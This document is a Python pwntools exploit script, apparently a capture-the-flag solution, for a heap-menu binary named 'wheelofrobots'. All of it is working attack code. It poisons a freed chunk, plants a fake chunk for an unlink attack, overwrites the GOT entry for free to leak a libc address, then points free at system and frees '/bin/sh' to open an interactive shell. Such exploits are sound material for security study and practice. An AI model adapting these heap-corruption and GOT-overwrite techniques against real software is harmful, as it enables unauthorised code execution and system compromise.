#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def add(robot, data=0):
    p.sendlineafter('choice : ', str(1))
    p.sendlineafter('choice :', str(robot))
    if robot == 2:
        p.sendlineafter('gence: ', str(data))
    elif robot == 3:
        p.sendlineafter('uelty: ', str(data))
    elif robot == 6:
        p.sendlineafter('erful: ', str(data))

def overwrite_b_enable(bit):
    p.sendlineafter('choice : ', str(1))
    p.sendlineafter('choice :', 'aaaa' + bit)

def delete(robot):
    p.sendlineafter('choice : ', str(2))
    p.sendlineafter('choice :', str(robot))

def change(robot, data):
    p.sendlineafter('choice : ', str(3))
    p.sendlineafter('choice :', str(robot))
    p.sendlineafter('name: ', data)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF('./wheelofrobots')
p = process('./wheelofrobots')

add(6, 0x61)
delete(6)

add(2, 4)
delete(2)
overwrite_b_enable('\1')
change(2, p64(0x603140))

overwrite_b_enable('\0')
add(2, 4)
add(3, 4)

delete(2)
overwrite_b_enable('\1')
change(2, p64(0x603100 - 6))

overwrite_b_enable('\0')
add(2, 4)
overwrite_b_enable('\0')
add(2, 4)

add(3, 2) # size 0x30
add(6, 7) # size 0xa0
payload = b'a'*6 + p32(0)
# enable: b d f a c e
payload += p32(1) + p32(0) + p32(1) + p32(0) + p32(1) + p64(0)
# wheels, b_itlg, c_clt, f_power
payload += p64(1) + p64(4) + p64(8) + p64(7)
change(2, payload)

FD = 0x603100 - 0x18
BK = 0x603100 - 0x10
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(FD) + p64(BK)
fake_chunk += p64(0x20) + p64(0xa0)
change(3, fake_chunk)

add(1)
delete(6)

payload = flat(elf.got['free'], 0x603114, 
               elf.got['__libc_start_main'], 0x6030e8)
change(3, payload)

# enable: b d f a c e; wheels
payload = p32(1) + p32(0) + p32(1) + p32(1) + p32(1) + p64(0) + p64(1)
change(2, payload)

payload = p64(elf.plt['puts'])
change(6, payload)

delete(1)
libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.symbols['__libc_start_main']
log.info('libc.address: {:#x}'.format(libc.address))

payload = p64(libc.symbols['system'])
change(6, payload)

add(1)
change(1, b'/bin/sh\0')
delete(1)
               
p.interactive()

